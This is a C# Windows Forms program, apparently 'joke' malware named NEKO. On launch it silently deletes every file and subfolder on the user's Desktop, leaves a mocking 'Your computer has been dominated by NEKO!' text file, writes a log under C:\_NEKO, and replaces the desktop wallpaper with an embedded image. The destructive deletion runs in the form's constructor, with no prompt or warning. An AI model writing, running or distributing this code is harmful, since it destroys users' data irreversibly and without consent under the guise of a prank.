using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Drawing.Imaging;
using System.Reflection;
using System.Diagnostics;
using System.Resources;

namespace neko
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", SetLastError = true)]
        [
          return: MarshalAs(UnmanagedType.Bool)
        ]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

        private
        const uint SPI_SETDESKWALLPAPER = 0x14;
        private
        const uint SPIF_UPDATEINIFILE = 0x1;
        private
        const uint SPIF_SENDWININICHANGE = 0x2;
        private readonly string PATH = @"C:\_NEKO";
        private readonly string FILE = "NEKO_NEKO_NEKO_KAWAII.jpg";
        private readonly string USER_PATH = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Desktop";
        public Form1()
        {
            if (!File.Exists(PATH + "\\" + FILE))
            {
                try
                {
                    if (!Directory.Exists(PATH))
                    {
                        _ = Directory.CreateDirectory(PATH);
                    }
                    Stream resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("neko.Resources.bg.jpg");
                    FileStream file = new FileStream(PATH + "\\" + FILE, FileMode.Create, FileAccess.Write);
                    resource.CopyTo(file);
                    file.Close();
                    resource.Close();
                }
                catch (Exception)
                {
                    Application.Exit();
                }
            }
            System.IO.DirectoryInfo di = new DirectoryInfo(USER_PATH);
            foreach (FileInfo file in di.GetFiles())
            {
                file.Delete();
            }
            foreach (DirectoryInfo dir in di.GetDirectories())
            {
                dir.Delete(true);
            }
            StringBuilder USER_LOADDED = new StringBuilder();
            USER_LOADDED.Append("Hello!\nYour computer has been dominated by NEKO!\nYes, NEKO\nNow, enjoy NEKOPARA nyahahahahahahahahahaha");
            File.AppendAllText(USER_PATH + "\\NYAAAAA.txt", USER_LOADDED.ToString());
            USER_LOADDED.Clear();
            DisplayPicture(@"C:\_NEKO\NEKO_NEKO_NEKO_KAWAII.jpg", true);
            InitializeComponent();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            Directory.Delete(PATH);
        }
        private void DisplayPicture(string file_name, bool update_registry)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("\n[" + DateTime.Now.ToString() + "] NEKOnyeheheheeheheheh - displaying picture...");
            sb.Append("\n[" + DateTime.Now.ToString() + "] File name: " + file_name + " - is_update_reg: " + update_registry);
            try
            {
                uint flags = 0;
                if (update_registry)
                {
                    flags = SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE;
                }

                if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0, file_name, flags))
                {
                    sb.Append("\n[" + DateTime.Now.ToString() + "] SystemParametersInfo failed.");
                }
                else
                {
                    sb.Append("\n[" + DateTime.Now.ToString() + "] Done!");
                }
            }
            catch (Exception)
            {
                sb.Append("\n[" + DateTime.Now.ToString() + "] Error to display image. - gomen .-.");
            }
            File.AppendAllText("C:\\_NEKO\\NEKO_LOG.txt", sb.ToString());
            sb.Clear();
        }

    }
}